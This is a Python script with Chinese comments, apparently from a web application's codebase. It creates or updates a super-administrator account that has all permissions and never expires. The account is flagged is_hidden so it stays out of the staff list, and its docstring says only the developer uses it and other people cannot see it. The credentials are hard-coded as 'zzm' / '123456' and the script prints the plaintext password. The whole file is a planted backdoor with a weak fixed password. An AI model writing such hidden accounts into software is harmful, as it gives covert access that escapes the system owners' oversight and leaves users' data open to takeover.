"""
创建隐藏的超级管理员账号
仅开发者使用，其他人无法在系统中看到此账号
"""
import sys
import os
from datetime import datetime

# 添加项目根目录到路径
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app.core.database import SessionLocal
from app.models.account import AccountUser
from app.core.security import get_password_hash


def create_hidden_admin():
    """创建或更新隐藏的超级管理员"""
    db = SessionLocal()
    
    try:
        # 隐藏管理员的账号信息（请修改为你自己的）
        username = "zzm"  # 修改为你想要的用户名
        password = "123456"  # 修改为你想要的密码
        real_name = "系统开发者"
        
        # 检查是否已存在
        existing = db.query(AccountUser).filter(
            AccountUser.username == username
        ).first()
        
        if existing:
            print(f"⚠ 隐藏管理员账号已存在，将更新密码...")
            print(f"  账号ID: {existing.id}")
            print(f"  用户名: {existing.username}")
            print(f"  旧密码: ******")
            
            # 更新密码
            existing.password = get_password_hash(password)
            existing.real_name = real_name
            existing.update_time = datetime.now()
            db.commit()
            
            print(f"✅ 密码更新成功！")
            print(f"  新密码: {password}")
            print(f"  更新时间: {existing.update_time}")
            return
        
        # 创建隐藏管理员
        hidden_admin = AccountUser(
            username=username,
            password=get_password_hash(password),
            real_name=real_name,
            account_type=1,  # 主账号（拥有所有权限）
            account_status=1,  # 启用
            is_hidden=1,  # 隐藏账号（在员工列表中不显示）
            status=1,  # 正常
            parent_id=None,  # 无父账号
            expire_time=None,  # 永不过期
            permissions=None,  # 拥有所有权限
            last_login_time=None,
            last_login_ip=None
        )
        
        db.add(hidden_admin)
        db.commit()
        db.refresh(hidden_admin)
        
        print("✅ 隐藏管理员账号创建成功！")
        print(f"  账号ID: {hidden_admin.id}")
        print(f"  用户名: {username}")
        print(f"  密码: {password}")
        print(f"  真实姓名: {real_name}")
        print(f"  账号类型: 1（主账号-隐藏）")
        print(f"  是否隐藏: 是")
        print(f"  创建时间: {hidden_admin.create_time}")
        print("\n⚠️ 请妥善保管账号密码，此账号在系统中不可见！")
        
    except Exception as e:
        print(f"✗ 操作失败: {str(e)}")
        db.rollback()
        import traceback
        traceback.print_exc()
    finally:
        db.close()


if __name__ == "__main__":
    print("=" * 60)
    print("创建/更新隐藏的超级管理员账号")
    print("=" * 60)
    create_hidden_admin()
